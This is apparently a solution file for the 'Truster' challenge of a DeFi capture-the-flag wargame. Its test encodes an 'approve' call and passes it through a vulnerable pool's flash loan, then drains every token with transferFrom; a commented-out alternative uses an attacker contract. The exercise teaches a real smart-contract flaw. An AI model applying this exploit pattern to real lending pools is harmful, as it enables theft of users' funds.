const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        const maliciousData = token.interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);

        /* Solution 1: Two transactions */
        await pool.connect(player).flashLoan(0, player.address, token.address, maliciousData);
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
        
        /* Solution 2: Use malicious contract */
        // const maliciousData2 = token.interface.encodeFunctionData("transferFrom", [pool.address, player.address, TOKENS_IN_POOL]);
        // let trusterAttacker = await (await ethers.getContractFactory('TrusterAttacker', player)).deploy(pool.address, token.address);
        // trusterAttacker.attack(token.address, maliciousData);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});
